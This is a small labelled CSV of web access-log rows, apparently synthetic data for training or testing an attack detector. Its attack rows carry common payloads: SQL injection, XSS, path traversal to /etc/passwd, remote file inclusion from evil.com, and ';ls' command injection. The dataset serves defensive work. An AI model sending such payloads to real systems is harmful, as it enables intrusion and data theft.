timestamp,ip,method,url,status_code,user_agent,is_attack,attack_type
2025-04-30 07:57:22,10.0.0.127,POST,/search?q=1' UNION SELECT null--,200,sqlmap/1.5,True,sql_injection
2025-04-30 07:57:22,192.168.0.243,POST,/js/app.js,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.46,POST,/search?q=<script>alert('x')</script>,200,curl/7.64.1,True,xss
2025-04-30 07:57:22,10.0.0.118,POST,/view?include=../../../../etc/passwd,403,curl/7.64.1,True,file_inclusion
2025-04-30 07:57:22,10.0.0.102,POST,/product?id=10 OR 1=1,403,Mozilla/5.0,True,sql_injection
2025-04-30 07:57:22,192.168.0.233,POST,/img/logo.png,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.101,GET,/page?file=http://evil.com/shell.txt,200,sqlmap/1.5,True,file_inclusion
2025-04-30 07:57:22,192.168.0.6,POST,/css/style.css,304,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.105,GET,/ping?ip=127.0.0.1;ls,500,Mozilla/5.0,True,command_injection
2025-04-30 07:57:22,192.168.0.154,GET,/css/style.css,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.57,POST,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,403,sqlmap/1.5,True,xss
2025-04-30 07:57:22,192.168.0.38,GET,/dashboard,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.162,GET,/page?file=http://evil.com/shell.txt,403,sqlmap/1.5,True,file_inclusion
2025-04-30 07:57:22,10.0.0.152,GET,/view?include=../../../../etc/passwd,403,sqlmap/1.5,True,file_inclusion
2025-04-30 07:57:22,10.0.0.188,POST,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,403,curl/7.64.1,True,xss
2025-04-30 07:57:22,192.168.0.181,GET,/contact,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.71,POST,/vendor/bootstrap.css,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.170,GET,/index.html,404,python-requests/2.25,False,normal
